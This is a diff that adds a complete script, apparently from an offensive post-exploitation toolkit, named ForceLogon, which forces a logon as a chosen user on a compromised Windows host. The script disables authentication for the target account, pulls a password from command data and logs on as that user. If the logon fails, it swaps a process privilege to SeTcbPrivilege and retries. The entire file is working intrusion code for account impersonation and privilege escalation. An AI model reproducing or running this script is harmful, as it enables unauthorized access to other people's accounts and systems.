@@ -1,0 +1,119 @@
+@echo off;
+@include "_CommandLine.dsi";
+@include "_ZippyBangShared.dsi";
+#--------------------------------------------------------
+# File: ForceLogon.dss
+#
+# Forces a logon as a given user
+#
+# Modifications:
+#  06/02/2008	Created.
+#--------------------------------------------------------
+
+# as an absolute minimum, both "put" and "shares" must be available
+if( !( 
+		IsCommandAvailable( "authentication" ) &&
+		IsCommandAvailable( "logonasuser" )
+) ) {
+	echo( "ForceLogon cannot run on this platform", ERROR );
+	echo( "Command necessary are unavailable", ERROR );
+	return false;
+}
+
+string %params;
+
+if( !_ParseCommandLine( $argc, $argv, %params ) ) {
+	return false;
+}
+
+# get a target
+if( !defined( %params{'user'} ) ) {
+	echo( "A user must be defined", ERROR );
+	return false;
+}
+
+string $type = "";
+if( defined( %params{'type'} ) ) {
+	$type = "-type %params{'type'}";
+}
+
+# disable authentication
+echo "Disabling authentication for %params{'user'}";
+@record on;
+if( !PrintStatus( `authentication -user "%params{'user'}"` ) ) {
+	return false;
+}
+@record off;
+
+int $authId;
+string $password;
+
+echo "Getting command data";
+if( !PrintStatus( (
+		GetCmdData( "CommandMetaData::id", 		$authId 	) && defined( $authId 	) &&
+		GetCmdData( "authentication::password", $password 	) && defined( $password )
+) ) ) {
+	echo "Re-enabling authentication";
+	PrintStatus( `stop authentication` );
+	return false;
+}
+
+string $domain = "";
+if( defined( %params{'domain'} ) ) { 
+	$domain = "-domain \"%params{'domain'}\"";
+}
+echo "Logging in as %params{'user'}";
+@record on;
+if( !PrintStatus( `logonasuser -user "%params{'user'}" -password "$password" $domain $type` ) ) {
+	bool $bail = true;
+	
+	string $original = "SeChangeNotifyPrivilege";
+	string $replace  = "SeTcbPrivilege";
+	echo( "Unable to logon.  You may be lacking the $replace privilege.", WARNING );
+	if( prompt( "Attempt to replace $original with $replace?" ) ) {
+		echo "Attempting to modify the privilege";
+		if( PrintStatus( `processmodify -orig $original -new $replace -privilege enabled` ) ) {
+			$bail = false;
+		} else {
+			echo( "Unable to modify the privilege.  _ForceLogon must exit", ERROR );
+		}
+	}
+
+	if( !$bail ) {
+		echo "Attempting to log as %params{'user'}";
+		$bail = !PrintStatus( `logonasuser -user "%params{'user'}" -password "$password" $domain $type` );
+	}
+	if( $bail ) {
+		echo "Re-enabling authentication";
+		PrintStatus( `stop $authId` );
+		return false;
+	}
+}
+@record off;
+
+int    $handle;
+string $alias;
+int    $taskId;
+echo "Getting command data";
+if( !PrintStatus( (
+		GetCmdData( "CommandMetaData::id", 	$taskId ) && defined( $taskId ) &&
+		GetCmdData( "logon::handle", 		$handle ) && defined( $handle ) &&
+		GetCmdData( "logon::alias",  		$alias  ) && defined( $alias  )
+) ) ) {
+	echo "Re-enabling authentication";
+	PrintStatus( `stop $authId` );
+	return false;
+}
+
+# write command data
+StartCmdData( "Logon" );
+AddCmdData( "task", 	$taskId );
+AddCmdData( "handle", 	$handle );
+AddCmdData( "alias",  	$alias  );
+StoreCmdData();
+
+echo "Re-enabling authentication";
+PrintStatus( `stop $authId` );
+return true;
+
+
